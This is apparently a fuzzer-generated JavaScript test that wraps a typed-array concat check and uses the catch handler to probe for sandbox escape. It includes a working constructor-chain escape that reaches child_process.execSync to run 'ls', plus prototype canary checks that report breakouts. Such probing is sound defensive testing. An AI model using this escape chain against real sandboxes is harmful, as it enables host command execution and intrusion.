try {
    function concatTypedArray(type, elems, modulo) {
        throw () => {
            return () => {
            };
        };
        var items = new Array(elems);
        var ta_by_len = new type(elems);
        for (var i = 0; i < elems; ++i) {
            ta_by_len[i] = items[i] = modulo === false ? i : elems % modulo;
        }
        var ta = new type(items);
        assert(compareArray([].concat(ta, ta), [
            ta,
            ta
        ]));
        ta[Symbol.isConcatSpreadable] = true;
        assert(compareArray([].concat(ta), items));
        assert(compareArray([].concat(ta_by_len, ta_by_len), [
            ta_by_len,
            ta_by_len
        ]));
        ta_by_len[Symbol.isConcatSpreadable] = true;
        assert(compareArray([].concat(ta_by_len), items));
        ta = new type(1);
        var defValue = ta[0];
        var expected = new Array(4000);
        expected[0] = defValue;
        Object.defineProperty(ta, 'length', { value: 4000 });
        ta[Symbol.isConcatSpreadable] = true;
        assert(compareArray([].concat(ta), expected));
    }
    var max = [
        Math.pow(2, 8),
        Math.pow(2, 16),
        Math.pow(2, 32),
        false,
        false
    ];
    [
        Uint8Array,
        Uint16Array,
        Uint32Array,
        Float32Array,
        Float64Array
    ].forEach(function (ctor, i) {
        concatTypedArray(ctor, 4000, max[i]);
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}